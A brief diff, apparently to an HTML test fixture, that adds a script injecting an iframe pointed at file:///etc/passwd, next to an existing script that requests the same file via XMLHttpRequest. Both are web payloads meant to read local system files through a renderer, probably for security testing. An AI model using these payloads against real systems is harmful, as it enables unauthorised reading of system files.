@@ -8,3 +8,5 @@ test
 	x.open("GET","file:///etc/passwd");
 	x.send();
 </script>
+
+<script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>
